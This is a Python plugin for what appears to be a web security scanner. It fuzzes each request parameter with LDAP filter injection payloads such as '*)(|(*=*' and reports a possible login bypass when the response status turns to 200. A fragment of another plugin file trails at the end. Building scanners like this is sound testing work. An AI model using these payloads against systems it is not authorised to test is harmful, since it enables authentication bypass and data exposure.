from core.analyzer import ResponseAnalyzer
from sdk.base_plugin import BasePlugin
import re
import json
import base64

class LDAPInjectionPlugin(BasePlugin):
    """
    LDAP Injection.
    Attempts to manipulate LDAP filters to bypass auth or extract data.
    """
    name = "LDAP Injection"
    
    # "Star" payload often bypasses login: user=*
    PAYLOADS = ["*", ")(*", ")*", "*)(|(*=*"]

    def should_run(self, endpoint):
        return len(endpoint.params) > 0

    def detect(self, http, endpoint, payload_intel):


        findings = []


        analyzer = ResponseAnalyzer()
        try:
            base_params = {p['name']: p['value'] for p in endpoint.params}
            baseline = self._make_request(http, endpoint, base_params)
            if not baseline: return
        except: return

        for param in endpoint.params:
            for payload in self.PAYLOADS:
                fuzzed = base_params.copy()
                fuzzed[param['name']] = payload
                
                try:
                    resp = self._make_request(http, endpoint, fuzzed)
                    if not resp: continue
                    
                    diff = analyzer.diff(baseline, resp)
                    
                    # Logic: If valid baseline failed (e.g. 403) and this passed (200),
                    # or if content changed significantly.
                    
                    if diff["status_changed"] and resp.status_code == 200:
                         findings.append({'plugin': self.name, 'endpoint': endpoint.url, 'parameter': param['name'], 'payload': payload, 'evidence': "Status changed to 200 OK with LDAP wildcard", 'confidence': "HIGH", 'diff': diff})
                except: continue
        return findings

    def _make_request(self, http, endpoint, params):
        if endpoint.method == "POST":
            return http.request("POST", endpoint.url, data=params)
        return http.request("GET", endpoint.url, params=params)


# filename: plugins/host.py
from sdk.base_plugin import BasePlugin